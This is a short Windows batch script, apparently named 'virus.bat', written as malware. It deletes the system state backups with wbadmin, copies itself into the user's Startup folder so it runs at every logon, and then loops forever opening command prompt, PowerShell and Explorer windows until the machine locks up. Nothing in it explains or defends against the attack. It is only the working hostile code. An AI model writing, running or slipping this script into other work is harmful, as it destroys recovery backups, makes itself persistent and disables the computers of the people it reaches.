@echo off
wbadmin delete systemstatebackup -keepVersions:0
echo %USERNAME%
@echo off
for /r C:\ %%f in (virus.bat) do (
   cls
    move "%%f" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
   cls
)

:a
start cmd
start powershell
start explorer
goto a
